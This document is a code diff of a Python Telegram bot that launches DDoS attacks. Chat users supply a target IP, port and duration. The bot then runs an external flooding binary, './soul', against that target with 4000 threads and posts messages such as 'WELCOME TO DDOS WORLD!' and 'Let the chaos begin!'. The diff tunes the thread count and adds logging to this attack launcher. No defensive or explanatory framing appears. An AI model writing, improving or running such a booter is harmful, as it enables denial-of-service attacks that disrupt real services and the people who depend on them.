@@ -14,7 +14,6 @@ bot.attack_in_progress = False
 bot.attack_duration = 0
 bot.attack_start_time = 0
 
-# Handle /attack command
 @bot.message_handler(commands=['attack'])
 def handle_attack_command(message):
     chat_id = message.chat.id
@@ -24,10 +23,10 @@ def handle_attack_command(message):
                                    "*Example: 167.67.25 6296 60* 🔥\n"
                                    "*Let the chaos begin! 🎉*", parse_mode='Markdown')
         bot.register_next_step_handler(message, process_attack_command)
+
     except Exception as e:
         logging.error(f"Error in attack command: {e}")
 
-# Process the attack input
 def process_attack_command(message):
     try:
         args = message.text.split()
@@ -57,26 +56,26 @@ def process_attack_command(message):
                                            f"*👉 Target Port: {target_port}*\n"
                                            f"*⏰ Duration: {duration} seconds! Let the chaos unfold! 🔥*", parse_mode='Markdown')
 
-        # Dynamically adjust the polling timeout based on the attack duration
-        timeout_value = duration + 20  # Give extra 20 seconds buffer
-        bot.polling(none_stop=True, interval=3, timeout=timeout_value)
-
-        # Start attack in a separate thread
         attack_thread = Thread(target=run_attack, args=(target_ip, target_port, duration, message.chat.id))
         attack_thread.start()
 
     except Exception as e:
         logging.error(f"Error in processing attack command: {e}")
 
-# Attack process
 def run_attack(target_ip, target_port, duration, chat_id):
     try:
         # Set the CPU affinity to use only the first 8 cores (core 0 to 7)
         pid = os.getpid()
         os.sched_setaffinity(pid, range(8))  # Restrict to CPUs 0-7
 
-        # Prepare the attack command
-        attack_command = ['./soul', target_ip, str(target_port), str(duration), '2000']
+        # Get the number of threads (you can either hardcode it or calculate dynamically)
+        num_threads = 4000  # Change this to the desired value
+
+        # Prepare the attack command, passing the 4 required arguments
+        attack_command = ['./soul', target_ip, str(target_port), str(duration), str(num_threads)]
+
+        # Logging the attack command for debugging
+        logging.info(f"Executing command: {' '.join(attack_command)}")
 
         # Start the attack
         process = subprocess.Popen(attack_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
@@ -84,8 +83,13 @@ def run_attack(target_ip, target_port, duration, chat_id):
         bot.send_message(chat_id, "*💥 The attack is ongoing... 💥*\n*⏳ Duration remaining: {} seconds*".format(duration), parse_mode='Markdown')
 
         # Wait for the process to complete
-        process.wait()
+        stdout, stderr = process.communicate()
 
+        # Logging stdout and stderr from the attack execution
+        if stderr:
+            logging.error(f"Error during attack execution: {stderr.decode()}")
+
+        # Send attack completion message
         bot.send_message(chat_id, "*🔥 The attack has been completed! 🛑*\n"
                                   "*💣 Duration completed, the chaos has ended!*")
 
@@ -93,7 +97,6 @@ def run_attack(target_ip, target_port, duration, chat_id):
         logging.error(f"Error in attack process: {e}")
         bot.send_message(chat_id, "*❗ Error occurred while executing the attack*.\nPlease try again.")
 
-# /myinfo command
 @bot.message_handler(commands=['myinfo'])
 def myinfo_command(message):
     chat_id = message.chat.id
@@ -102,13 +105,10 @@ def myinfo_command(message):
                 "*⏳ Valid Until: N/A*")
     bot.send_message(chat_id, response, parse_mode='Markdown')
 
-# /start command
 @bot.message_handler(commands=['start'])
 def start_message(message):
     bot.send_message(message.chat.id, "*🌍 WELCOME TO DDOS WORLD!* 🎉\n\n"
                                        "*🚀 Get ready to dive into the action!*")
 
-# Main entry point for bot
 if __name__ == "__main__":
-    bot.remove_webhook()   # Clean up any existing webhook
-    bot.polling(none_stop=True, interval=3, timeout=15)
+    bot.polling(none_stop=True)
